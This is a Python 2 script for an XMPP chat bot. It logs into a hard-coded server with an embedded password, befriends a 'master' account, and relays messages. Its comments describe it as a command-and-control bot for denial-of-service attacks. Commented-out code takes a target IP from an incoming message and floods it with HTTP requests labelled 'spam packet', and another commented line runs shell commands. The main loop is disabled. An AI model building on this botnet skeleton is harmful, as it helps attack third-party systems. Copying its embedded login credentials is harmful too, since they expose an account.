#!/usr/bin/python2

#from subprocess import call
import sys,os,xmpp,time,select, socket
from xmpp import *

class Bot:

    def __init__(self,jabber,remotejid):
        self.jabber = jabber
        self.remotejid = remotejid

    def register_handlers(self):
        self.jabber.RegisterHandler('message',self.xmpp_message)

    def xmpp_message(self, con, event):
        type = event.getType()
        fromjid = event.getFrom().getStripped()
        if type in ['message', 'chat', None]:
            #here's where you recieve a message
            sys.stdout.write(event.getBody() + '\n')
            # So for example if you wanted to DDoS and you had a command that would send an IP address to attack, for example:
            #sys.stdout.write("Sending spam packet to: " + event.getBody() + '\n')
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.connect((event.getBody(), 80))
            #s.sendall('GET / HTTP/1.1\r\nHost: ' + event.getBody() + '\r\n\r\n')
            #s.close()
            #call(["ls", "-l"])

    def stdio_message(self, message):
        #I believe this is for sending files over xmpp
        m = xmpp.protocol.Message(to=self.remotejid,body=message,typ='chat')
        self.jabber.send(m)

    def xmpp_connect(self):
        con=self.jabber.connect(('54.191.94.255','5222'),None,None)
        if not con:
            sys.stderr.write('could not connect!\n')
            return False
        sys.stderr.write('connected with %s\n'%con)
        auth=self.jabber.auth(jid.getNode(),jidparams['password'],resource='crappy_script')
        if not auth:
            sys.stderr.write('could not authenticate!\n')
            return False
        sys.stderr.write('authenticated using %s\n'%auth)
        self.register_handlers()
        return con

if __name__ == '__main__':

    #PROBABLY SHOULD CHANGE THIS, EH?
    jidparams={'jid': 'bot_sagarwl4@54.191.94.255', 'password': 'DA2tSUDU7'}
    
    jid=xmpp.protocol.JID(jidparams['jid'])
    cl=xmpp.Client('54.191.94.255',debug=[])
    print jid.getDomain()
    
    bot=Bot(cl,'bot_sagarwl4@54.191.94.255')

    if not bot.xmpp_connect():
        sys.stderr.write("Could not connect to server, or password mismatch!\n")
        sys.exit(1)

    #cl.SendInitPresence(requestRoster=0)   # you may need to uncomment this for old server
    
    socketlist = {cl.Connection._sock:'xmpp',sys.stdin:'stdio'}
    cl.sendInitPresence()
    myRoster =  cl.getRoster()

    #Register yourself so you can talk to your master... not necessary every time you run, but necessary the first time you run
    #Each side of the conversation needs to "friend" each other. Subscribe makes it so the bot "friend requests" you.
    #Authorize makes it so the Bot "accepts your friend request"
    myRoster.Subscribe('sagarwl4@54.191.94.255')
    myRoster.Authorize('sagarwl4@54.191.94.255')
    online = 0
    #bot.xmpp_connect()
    bot.stdio_message("hihi")

    while online:
        (i , o, e) = select.select(socketlist.keys(),[],[],1)
        for each in i:
            if socketlist[each] == 'xmpp':
                cl.Process(1)
            elif socketlist[each] == 'stdio':
                msg = sys.stdin.readline().rstrip('\r\n')
                bot.stdio_message(msg)
            else:
                raise Exception("Unknown socket type: %s" % repr(socketlist[each]))
    #cl.disconnect()

